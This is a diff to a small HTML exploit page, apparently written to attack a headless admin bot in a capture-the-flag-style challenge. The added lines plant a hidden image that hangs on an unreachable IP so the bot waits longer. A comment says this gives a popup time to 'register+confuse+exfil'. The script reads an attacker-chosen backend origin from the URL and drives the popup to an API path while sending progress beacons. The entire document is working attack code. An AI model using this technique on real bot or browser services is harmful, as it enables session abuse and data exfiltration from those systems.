@@ -1,9 +1,10 @@
 <!doctype html>
 <html><head><meta charset="utf-8"><title>a</title></head>
 <body><h1>loading</h1>
+<!-- hanging resource: keeps main page from reaching networkidle0 so the bot's
+     goto() waits the full ~10s, giving the popup time to register+confuse+exfil -->
+<img src="http://10.255.255.1/keepalive" style="display:none">
 <script>
-// backend origin from ?b=<origin> (default backend:8080). Putting it in the report URL
-// as ?b=http://host also makes the bot's arenaOrigin() mark that origin secure.
 const q = new URLSearchParams(location.search);
 const B = (q.get('b') || 'http://backend:8080').replace(/\/+$/,'');
 const P = '2';
@@ -17,6 +18,6 @@ setTimeout(function(){
   bx('step=confuse');
   try { w.location=B+'/api/content/'+P+'/2'; bx('step=navdone'); }
   catch(e){ bx('step=naverr&e='+encodeURIComponent(''+e)); }
-}, 1500);
+}, 3000);
 </script>
 </body></html>
